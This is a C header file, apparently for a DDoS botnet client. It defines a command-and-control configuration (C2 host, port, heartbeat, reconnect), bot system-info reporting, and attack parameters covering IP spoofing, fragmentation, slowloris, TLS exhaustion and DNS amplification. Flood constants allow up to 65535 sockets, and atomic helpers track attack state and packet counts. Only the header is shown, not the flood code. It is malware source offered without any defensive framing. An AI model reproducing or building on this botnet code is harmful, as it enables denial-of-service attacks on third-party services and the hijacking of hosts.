#ifndef BOT_H
#define BOT_H

#define _GNU_SOURCE

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sched.h>
#include <time.h>
#include <sys/socket.h>
#include <sys/sysinfo.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <net/if.h>
#include <netdb.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <sys/file.h>
#include <sys/poll.h>
#include <sys/resource.h>
#include <ifaddrs.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/sha.h>
#include <zlib.h>

/* ── Constants ─────────────────────────────────── */
#define MAX_PAYLOAD 65507  /* max UDP payload (64K - headers) */
/* MEGA: base power — 65535 sockets, 1024 batch, 128MB buf, ZC */
#define MEGA_BATCH_MAX 4096
#define MEGA_SOCKS_PER_CPU 512
#define MEGA_MAX_SOCKS 65535
#define MEGA_PAYLOAD 1400
#define MAX_SOCKETS 65535
#define RING_BUF_SIZE (MEGA_BATCH_MAX * MEGA_PAYLOAD)
#define SOCKET_BUF_SIZE_MAX (128 * 1024 * 1024)
#define SOCKET_BUF_SIZE_MIN (4 * 1024 * 1024)
#define MAX_PAYLOADS 10000
#define MAX_PROCESSES 8
#define CPU_LOAD_THRESHOLD 98

/* ── Types ─────────────────────────────────────── */
typedef struct {
    char c2_host[256];
    int c2_port;
    char c2_path[256];
    int use_ssl;
    int heartbeat_int;
    int reconnect_min, reconnect_max, stale_timeout;
    unsigned int default_pps, default_threads;
    unsigned int spoof_mode, fragmentation;
    char bot_version[32];
} Config;

typedef struct {
    char hwid[32], ip_addr[64], os_ver[128];
    int cpu_cores, ram_mb, net_mbps;
} SysInfo;

typedef struct {
    char target[256];
    int port;
    char method[32];
    int duration_secs;
    unsigned int max_pps, max_threads;
    unsigned int spoof_mode, fragmentation;
    unsigned int slowloris, tls_exhaust, dns_amp, mega_mode;
} AttackParams;

typedef struct {
    double rate, burst, tokens;
    struct timespec last;
    pthread_mutex_t mtx;
} TokenBucket;

/* ── Globals ───────────────────────────────────── */
extern volatile int g_shutdown;
extern volatile int g_attack_stop;
extern unsigned long long g_pkt_count;
extern unsigned long long g_byte_count;
extern volatile int g_attack_active;
extern char g_bot_uuid[64];
extern char g_cur_task_id[64];

/* Atomic attack-state helpers (x86/ARM memory barriers via GCC builtins) */
static inline void request_attack_stop(void) {
    __sync_lock_test_and_set(&g_attack_stop, 1);
}
static inline void clear_attack_stop(void) {
    __sync_lock_release(&g_attack_stop);
}
static inline int is_attack_stop(void) {
    return __sync_fetch_and_add(&g_attack_stop, 0);
}
static inline void set_attack_active(int v) {
    if (v) __sync_lock_test_and_set(&g_attack_active, 1);
    else __sync_lock_release(&g_attack_active);
}
static inline int is_attack_active(void) {
    return __sync_fetch_and_add(&g_attack_active, 0);
}

/* Inline helpers for atomic counters (thread-safe without mutex) */
static inline void pkt_sent(int bytes) {
    __sync_fetch_and_add(&g_pkt_count, 1ULL);
    __sync_fetch_and_add(&g_byte_count, (unsigned long long)(bytes > 0 ? bytes : 1));
}

typedef struct {
    AttackParams atk;
    Config *cfg;
} BgAttackCtx;

#endif /* BOT_H */
